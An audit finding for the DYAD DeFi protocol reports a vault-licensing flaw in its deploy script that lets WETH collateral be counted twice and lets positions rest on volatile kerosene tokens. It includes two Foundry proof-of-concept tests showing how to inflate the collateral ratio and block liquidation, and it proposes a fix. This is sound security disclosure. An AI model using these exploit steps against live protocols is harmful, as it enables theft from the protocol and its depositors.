[H-01] Design flaw and mismanagement in vault licensing leads to double counting in collateral ratios and positions collateralized entirely with kerosine
Submitted byMaroutis, also found byfalconhoof, pontifex (1,2),0xleadwizard,Hueber,grearlake,josephdara,0xlemon,gumgumzum,Emmanuel,ych18,Al-Qa-qa, adam-idarrha (1,2),CodeWasp, Honour (1,2), 0xabhay (1,2), oakcobalt (1,2), SBSecurity (1,2),Infect3d,SpicyMeatball, Limbooo (1,2),AM,LeoGold,Daniel526,Giorgio,KupiaSec, Circolors (1,2),neocrao,0xtankr,The-Seraphs,0xShitgem,poslednaya,ke1caM, ljj (1,2), TheSchnilch (1,2),bhilare_, n4nika (1,2),btk, iamandreiski (1,2,3), VAD37 (1,2),0xnilay,Aamir,carlitox477,n0kto,petro_1912,Abdessamed,itsabinashb,shaflow2, web3km (1,2),dimulski,ZanyBonzy, shikhar229169 (1,2), T1MOH (1,2),zigtur,Topmark,Krace,cinderblock,Egis_Security, AlexCzm (1,2),3docSec,PoeAudits,TheSavageTeddy,kennedy1030,0x486776, and zhaojohnson (1,2)
https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/script/deploy/Deploy.V2.s.sol#L64-L65
https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/script/deploy/Deploy.V2.s.sol#L95-L96
Impact
Due to a design flaw in the protocol’s management of vault licensing and the deploy script, a significant risk exists where collateral can be counted twice in the calculation of the Collateralization Ratio. This occurs because WETH vaults are incorrectly licensed to both theKeroseneManagerandVaultLicenser, allowing users to register the same asset and their NFT ID in both Kerosene vaults and normal vaults. This can allow users to exploit this to greatly inflate their CR calculations, misleading the protocol into considering a position more secure than it truly is, which can prevent necessary liquidations and pose significant risk to the protocol.
However, a user can also register his ID and thekeroseneVaultas a normalvaultbecause the script calls the licensing function for thekerosineVaultsusing theVaultLicenserrather than thekerosineManager. This can lead to positions entirely collateralized with kerosene token. Which is not what protocol intends to do and is very risky as the kerosene token is endogenous and has a manipulable asset price.
Proof of Concept
Basically, there are two exploits with devastating impacts on the protocol:
Exploit #1:TheDeployV2script calls both contract licensing tx functions on the weth vault.
kerosineManager.add(address(ethVault));kerosineManager.add(address(wstEth));
and:
vaultLicenser.add(address(ethVault));vaultLicenser.add(address(wstEth));
The licensing via thekerosineManageralso has to be done, because the weth vaults will be used by theUnboundedKerosineVaultcontract during the price calculation of the kerosine asset.
This can be exploited where users can call bothVaultManagerV2::addKeroseneandVaultManagerV2::addfunctions with their id and the weth vault as parameters. TheVaultManagerV2::collatRatiouses bothvaultsandvaultsKerosenemapping to calculate the value of the stored assets. Since, weth vault is added in both mappings the assets be counted twice.
Consider the following test:
functiontest_CanMintSameAmountAsDeposit()public{// address RECEIVER2 = makeAddr("Receiver2");uint256id=mintDNft();uint256id2=mintDNft();// Add vault in both contractsvaultManagerV2.add(id,address(wethVaultV2));vaultManagerV2.add(id2,address(wethVaultV2));vaultManagerV2.addKerosene(id,address(wethVaultV2));// Deposits 1e25 USD of WethdepositV2(weth,id,address(wethVaultV2),1e22);// Price weth 1000// Mint 1e25vaultManagerV2.mintDyad(id,1e25,RECEIVER);// Protocol considers that User has deposited twice the amount in the collateral ratio calculationconsole.log("CR of position",vaultManagerV2.collatRatio(id));// 200%// Position is not liquidatable even if it is only collateralized at 100%vm.expectRevert(IVaultManager.CrTooHigh.selector);vm.prank(RECEIVER);vaultManagerV2.liquidate(id,id2);}
Exploit #2:TheDeployV2script calls the licensing tx functions on the kerosine vaults using thevaultLicenser:
vaultLicenser.add(address(unboundedKerosineVault));// vaultLicenser.add(address(boundedKerosineVault));
This has to be done via thevaultLicenserinstead of thekerosineManagerso that the kerosene vault assets would not be taken into account during the price calculation of the kerosine asset.
A user can just call theVaultManagerV2::addfunction with their ID and kerosine vault as parameters. Since, the kerosine vault will be stored inside thevaultsmappings, some positions can be mostly or entirely collateralized with the kerosine asset, which is not what is intended by the protocol. In fact kerosene is a volatile asset and can cause stability and liquidity issues to the protocol.
Consider the following test:
functiontest_addKeroseneAsExoColl()public{uint256id=mintDNft();uint256id2=mintDNft();// Follow script deployment. Weth Vault is licensed in both VaultManager and KerosineManager// A user can just add his id and the WethVault in the kerosine mapping and kerosineVault in the vault mappingvaultManagerV2.addKerosene(id,address(wethVaultV2));vaultManagerV2.add(id,address(unboundedKerosineVault));// Assume weth was deposited by other usersdepositV2(weth,id2,address(wethVaultV2),1e24);//weth 1000 Usd// User deposits kerosine using idkerosineMock.mint(address(this),1e20);kerosineMock.approve(address(vaultManagerV2),1e20);vaultManagerV2.deposit(id,address(unboundedKerosineVault),1e20);console.log("Kerosine price",unboundedKerosineVault.assetPrice());//9999//Then mint dyadvaultManagerV2.mintDyad(id,1e19,RECEIVER);// => Position 150% collateralized with kerosine tokens// !! User cannot add kerosine bounded or unbounded vaults in the kerosine mapping in the vault Manager// !! and id and weth vault can be added in both kerosene and normal vaults which would make the amount deposited calculated twice in the collateralRatio}
Tools Used
Foundry test
Recommended Mitigation Steps
The design of the licensing part needs to be re-thinked. The issue here is that the vaults mapping of theKerosineManagercontract which is constructed via the methodKerosineManager::addis the same mapping that is used by theUnboundedKerosineVault::assetPricefunction. You can consider creating two separate mappings.
One used only for the price calculation in theUnboundedKerosineVaultassetPricecontract which would only include the classic vaults (weth …); another mapping used for the licensing part which would include the kerosene vaults.
Let’s assume these were implemented, we have now two mappings. TheDeployV2should change as follows:
kerosineManager.addVaultForOracleCalculation(address(ethVault));kerosineManager.addVaultForOracleCalculation(address(wstEth));kerosineManager.add(address(unboundedKerosineVault));kerosineManager.add(address(boundedKerosineVault));
Assuming theaddVaultForOracleCalculationfeeds a mapping that will be used byUnboundedKerosineVault::assetPricewhileadddoesn’t.
shafu0x (DYAD) acknowledged
Note: For full discussion, seehere.